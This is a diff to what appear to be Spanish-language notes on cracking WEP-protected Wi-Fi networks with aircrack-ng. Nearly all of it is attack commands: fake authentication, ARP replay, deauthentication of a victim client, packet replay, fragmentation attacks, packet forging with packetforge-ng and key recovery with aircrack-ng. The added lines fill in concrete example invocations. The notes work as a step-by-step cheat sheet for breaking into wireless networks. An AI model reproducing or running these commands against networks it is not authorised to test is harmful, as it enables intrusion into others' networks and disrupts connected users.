@@ -47,6 +47,7 @@ aireplay-ng -1 0 -e <essid_AP> -a <bssid_AP> -h <MAC_wlan0mon> wlan0mon		 (Fake 
 aireplay-ng -3 -b <bssid_AP> -h <MAC_wlan0mon> wlan0mon						 (ARP replay attack)
 aireplay-ng -0 1 -a <bssid_AP> -c <MAC_VICTIMA> wlan0mon					 (Deauthentication attack)
 aircrack-ng -b <bssid_AP> <captura.cap>
+(aircrack-ng -0 wep.cap) video
 
 #CRACKING WEP A TRAVËS DE UN CLIENTES CONECTADO
 airmon-ng start wlan0
@@ -54,6 +55,7 @@ airodump-ng -c <canal> -bssid <bssid_AP> -w <save_file> wlan0mon
 aireplay-ng -1 0 -e <essid_AP> -a <bssid_AP> -h <mac_wlan0mon> wlan0mon		(Fake authentication)
 aireplay-ng -2 -b <bssid_AP> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon (Interactive Packet Replay Attack)
 aircrack-ng -z <file .cap>
+(aircrack-ng -0 -z -n 64 wep.cap) video
 
 # ELUDIR LA AUTENTICACION DE CLAVE COMPARTDA WEP
 airmon-ng start wlan0
@@ -82,6 +84,7 @@ airodump-ng -c <canal> --bssid <bssid_AP> -w <save_file> wlan0mon
 aireplay-ng -1 0 -e <essid_AP> -a <bssid_AP> -h <MAC_wlan0mon> wlan0mon
 aireplay-ng -5 -b <bssid_AP> -h <MAC_wlan0mon> wlan0mon						  (ataque de fragmentacion)
 packetforge-ng -0 -a <bssid_AP> -h <MAC_wlan0mon> -l <SOURCE_IP> -k <DEST_IP> -y <file .xor> -w <save_file_2>
+(packetforge-ng -0 -a <bssid_AP> -h <MAC_wlan0mon> -l 192.168.1.101 -k 192.168.1.255 -y <file .xor> -w injectmetoo.cap)
 aireplay-ng -2 -r <save_file_2> wlan0mon
 aircrack-ng <file_.cap>
 
@@ -89,5 +92,5 @@ aircrack-ng <file_.cap>
 
 
 aireplay -a -b (?)
-
+startx (modo grafico backtrack)
 
